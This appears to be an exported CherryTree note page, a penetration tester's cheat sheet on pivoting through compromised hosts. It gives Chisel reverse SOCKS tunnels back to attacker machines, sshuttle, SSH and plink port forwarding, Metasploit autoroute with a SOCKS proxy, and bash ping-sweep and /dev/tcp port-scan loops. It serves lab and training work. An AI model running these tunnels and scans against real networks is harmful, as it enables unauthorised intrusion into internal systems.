<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>tools</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>tools</h1><br/><p></p><p><strong><h2>Chisel </h2></strong><ul><li><h3>a fast TCP/UDP tunnel, transported over </h3></li></ul><h3></h3></p><p><h3></h3>HTTP<h3>, secured via SSH</h3><h3></h3></p><p><h3></h3>   <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#Run command on attacker machine (10.10.101.51)</span><br />.<span style="color:#ff9d00;font-weight:700">/</span>selchi-linux-v1.10.0 server -p 8001 --reverse<br /><br /><span style="color:#0088ff;font-weight:400">#Run command on Web Server machine (172.16.1.101 || 10.10.101.50)</span><br />.<span style="color:#333333;font-weight:400">\c</span>hisel.exe  <br /><br /><span style="color:#0088ff;font-weight:400">## open one port e.g map local 8002 with victim 8000</span><br />.<span style="color:#333333;font-weight:400">\s</span>elchi-windows-v1.10.0.exe client 51.68.80.30:8001 R:1080:socks<br /><span style="color:#0088ff;font-weight:400">## open one port e.g map local 3306 with victim 3306</span><br /> .<span style="color:#ff9d00;font-weight:700">/</span>chisel client 10.10.14.8:8001 R:3306:127.0.0.1:3306 <span style="color:#ff9d00;font-weight:700">&amp;</span><br /><br /><span style="color:#0088ff;font-weight:400">#Run command on attacker machine (10.10.101.50 || 172.16.1.101)</span><br /><span style="color:#0088ff;font-weight:400"># At the bottom of the /etc/proxychains.conf add socks5 127.0.0.1 1080</span><br />proxychains4 nmap 172.16.1.1/24</pre></div></p><p></p><p><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><strong><h2>sshuttle</h2></strong><ul><li> <h3>sshuttle -r USER@MACHINE_IP &lt;IP_range&gt;</h3><ul><li><h3>sshuttle -r linux-admin@10.200.107.33 10.200.107.0/24</h3></li><li><h3>//it simulates a VPN, allowing us to route our traffic through the proxy </h3><em><h3>without the use of proxychains</h3></em><h3> (or an equivalent)</h3></li><li><h3>// sshuttle is only able to tunnel TCP packets, thus for host discovery (ICMP packets) we have to execute the following code on the L-SRV01 machine:</h3><ul><li><h3>for i in {1..254} ;do (ping -c 1 10.200.107.$i | grep &quot;bytes from&quot; | awk &#39;{print $4}&#39; | cut -d &quot;:&quot; -f 1 &amp;) ;done</h3></li><li><h3>for ip in 30 31 35; do echo &quot;10.200.111.$ip:&quot;; for i in {1..15000}; do echo 2&gt;/dev/null &gt; /dev/tcp/10.200.111.$ip/$i &amp;&amp; echo &quot;$i open&quot;; done; echo &quot; &quot;;done;</h3></li></ul></li></ul></li></ul><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><ul><li><h3>rathen then specifying subnets we could just let them figure it out with -N </h3></li></ul><h3></h3></p><p><h3> ◇ sshuttle with private key </h3><h3></h3></p><p><h3> </h3>◇ ▪ <h3>sshuttle -r user@address --ssh-cmd &quot;ssh -i KEYFILE&quot; SUBNET</h3></p><p>  <ul><li>e.g : <h3>sshuttle -r user@172.16.0.5 --ssh-cmd &quot;ssh -i private_key&quot; 172.16.0.0/24</h3></li></ul></p><p>  <ul><li>-<h3>x $ssh_target_ip</h3></li></ul></p><p><ul><li>- <h3>exclude the target machine if it is in the range otherwise we get an error </h3></li></ul></p><p>  </p><p></p><p></p><p></p><p></p><p></p><p><h3></h3></p><p><h3> </h3><strong><h2>Proxychains :</h2></strong><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> This where proxychains will look in this order </h3>◇ <h3>The current directory (i.e. ./proxychains.conf)</h3><ul><li>◇ <h3>◇ ~/.proxychains/proxychains.conf</h3></li></ul><h3></h3></p><p><h3> ◇ /etc/proxychains.conf</h3><h3></h3></p><p><h3> ◇ </h3><h3></h3></p><p><h3> </h3></p><p><h3></h3></p><p><h3> </h3><h3>SSH port forwarding linux </h3><ul><li>  <h3>ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN</h3></li><li> <h3>we have  a webserver runing on .80 that we want to forward to a target that we have access to</h3></li><li> <h3>ssh -D 1337 user@172.16.0.5 -fN</h3></li><li> <h3>open port 1337 on our attack box from which we could send send commands to the target</h3></li><li><h3>proxychains combined </h3></li><li>  <h3>ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN</h3></li><li> <h3>sudo systemctl start ssh</h3><ul><li> <h3>e.g : ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN</h3></li></ul></li></ul></p><p>  <ul><li>- <h3>// ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN</h3></li></ul><h3></h3></p><p><h3></h3>  </p><p></p><p><ul><li><h3> </h3></li></ul></p><p></p><p></p><p></p><p></p><p><strong><h3>SSH port forwarding windows: plink.exe</h3></strong><h3>◇ cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N</h3><h3></h3></p><p><h3>  </h3><h3></h3></p><p><h3> ◇ ▪  connection </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3></p><p><h3></h3></p><p><h3> </h3><strong><h3>Pivoting: Metasploit </h3></strong>◇ <h3>search autoroute </h3><ul><li>◇ <h3>◇ Set SUBNET 192.243.111.0</h3></li></ul><h3></h3></p><p><h3> ◇ set session 2 </h3><h3></h3></p><p><h3> ◇ exploit </h3><h3></h3></p><p><h3> ◇ use auxilliary/scanner/portscan/tcp </h3><h3></h3></p><p><h3> ◇  after setting autorute set proxy with auxiliary/server/socks4a module.</h3><h3></h3></p><p><h3> ◇  change SRVPORT to another port like 9050</h3><h3></h3></p><p><h3> ◇ update proxychains.conf</h3><h3></h3></p><p><h3> ◇ check if the proxy is running with netstat</h3><h3></h3></p><p><h3> ◇  proxychains nmap &lt;target&gt;</h3><h3></h3></p><p><h3> </h3></p><p><h3></h3></p><p><h3> </h3></p></div>
</body>
</html>
